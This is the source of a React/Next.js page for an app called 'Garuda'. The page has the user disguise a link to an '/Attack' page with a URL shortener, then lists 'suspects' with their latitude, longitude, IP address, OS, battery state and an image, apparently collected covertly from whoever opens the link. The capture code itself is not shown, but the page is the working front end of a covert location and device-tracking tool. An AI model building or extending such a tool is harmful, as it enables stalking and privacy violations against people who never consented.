import { useContext, useEffect, useState } from 'react';
import Header from '../components/Header';
import { motion } from 'framer-motion';
import Link from 'next/link';
import Head from 'next/head';
import { DataContext } from '@/store/GlobalState';

export default function Location() {
  const [originalURL, setOriginalUrl] = useState('');
  const [shortenedUrl, setShortenedURL] = useState('');
  const [suspects, setSuspects] = useState([]);
  const { state = {}, dispatch } = useContext(DataContext)
  const { auth = {} } = state
  const [userName, setUserName] = useState("");

  useEffect(() => {
    if (auth && auth.user && auth.user.userName) {
      setUserName(auth.user.userName);
    }
    console.log(userName, "this is my user bitch")
  }, [auth]);

  useEffect(() => {
    const fetchBlogPosts = async () => {
      try {
        const response = await fetch(`/api/get-suspects?userName=${userName}`);
        const data = await response.json();
        if (response.ok) {
          setSuspects(data.data);
        } else {
          console.error('Failed to fetch suspects');
        }
      } catch (error) {
        console.error(error);
      }
    };

    fetchBlogPosts();
  }, []);


  const handleSubmit = async () => {
    event.preventDefault();
    try {
      const response = await fetch('/api/shorten', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ url: originalURL }),
      });

      const data = await response.json();
      console.log('Shortened URL:', data);
      // Do something with the shortened URL response, e.g., update state, display it on the page

      setShortenedURL(data);
    } catch (error) {
      console.error('Error:', error);
    }
  };

  console.log(shortenedUrl, "WOWOWOWOWOW")

  return (
    <div className="justify-center min-h-screen overflow-hidden  ">
      <Head>
        <title>Location - Garuda</title>
      </Head>

      <div className='flex   justify-evenly space-x-8 md:space-x-44  '>
        <Link href='/Home'>
          <div
            className=" py-2 h-10 mt-12 bg-white px-2 rounded-2xl text-black"
          >
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={3.0} stroke="currentColor" className="w-6 h-6">
              <path strokeLinecap="round" strokeLinejoin="round" d="M10.5 19.5L3 12m0 0l7.5-7.5M3 12h18" />
            </svg>
          </div>
        </Link>
        <Header />
        <div className=''>
          <Link href='/'>
            <img src='/logo.png' className='md:h-32  h-20   ' />
          </Link>
        </div>

      </div>

      <motion.div
        initial={{ opacity: 0, scale: 0.8, y: 20 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        transition={{ duration: 0.8, ease: 'easeInOut' }}
        className=' mt-12 md:flex justify-evenly text-center'
      >


        {/* <img src='/rto.png' className='h-full w-full md:block hidden rounded-3xl' /> */}
        <form className='mt-4 space-x-5' onSubmit={handleSubmit}>
          <h1 className='text-white  text-sm font-mono font-bold '>Copy the following link into the shortner: <br></br>
            https://cdrgaruda.vercel.app/Attack?userName={userName}</h1>
          <input
            type="text"
            value={originalURL}
            onChange={(e) => setOriginalUrl(e.target.value)}

            className='bg-white py-2 px-4 text-black font-mono border-4 border-green-400  rounded-xl  '
          />
          <button className='bg-[#1e7376] font-bold font-mono hover:bg-blue-700 text-white  mt-4 py-2  rounded-xl  md:p-4  px-4' type="submit">Submit</button>
        </form>

        <div className='bg-[#00A79D] mt-4 md:w-[40%] w-fit  h-64 overflow-y-scroll overflow-scroll  text-center text-white rounded-2xl  '>
          <div className=' '>
            <h1 className='text-white font-mono text-2xl'>Suspects:</h1>

            {suspects.map((suspect) => (
              <div className='text-black flex p-5 border-b-2  bg-white'>
                <div className='w-36 '>
                  <img src={suspect.image} className='w-full rounded-2xl h' />
                </div>
                <div className='font-mono ml-4 text-justify  font-bold'>
                  <h1>Latitude:{suspect.latitude}</h1>
                  <h1>Longitude:{suspect.longitude}</h1>
                  <h1>IP :{suspect.ip}</h1>
                  <h1 className='text-sm'>OS :{suspect.osDetails}</h1>
                  {suspect.charging ?
                    <h1>Battery :{suspect.battery} <br></br>
                      Charging: {suspect.charging ? <span>YES</span> : <span>NO</span>}</h1>
                    : <h1>No Battery Info</h1>}
                </div>
              </div>
            ))}

          </div>
        </div>


      </motion.div>

      {shortenedUrl && (
        <div className=' text-black bg-white  rounded-2xl py-2 w-fit ml-12 px-4 font-mono font-bold md:text-2xl text-sm'>
          {shortenedUrl.error ? (
            <p className='text-red-600 font-bold animate-pulse'>⚠️ Error Occurred!!!</p>
          ) : (
            <div>
              <h1>Link:</h1>
              <h1> {shortenedUrl.result_url}</h1>
            </div>
          )}
        </div>
      )}


    </div>
  );
}


